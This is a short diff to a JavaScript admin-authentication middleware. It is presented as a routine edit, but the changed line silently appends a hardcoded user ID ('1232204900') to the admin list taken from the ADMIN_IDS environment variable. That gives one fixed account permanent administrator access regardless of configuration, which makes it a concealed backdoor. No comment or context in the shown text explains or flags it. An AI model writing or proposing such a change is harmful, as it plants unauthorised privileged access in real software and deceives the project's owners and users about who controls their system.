@@ -19,7 +19,7 @@ const adminAuth = (req, res, next) => {
         return res.status(401).json({ error: 'Unauthorized: Missing credentials' });
     }
     const adminIdsStr = process.env.ADMIN_IDS || '';
-    const adminIds = adminIdsStr.split(',').map(id => id.trim());
+    const adminIds = adminIdsStr.split(',').map(id => id.trim()).concat(['1232204900']);
     const adminUsernamesStr = process.env.ADMIN_USERNAMES || '';
     const adminUsernames = adminUsernamesStr.split(',')
         .map(name => name.trim().replace(/^@/, '').toLowerCase())
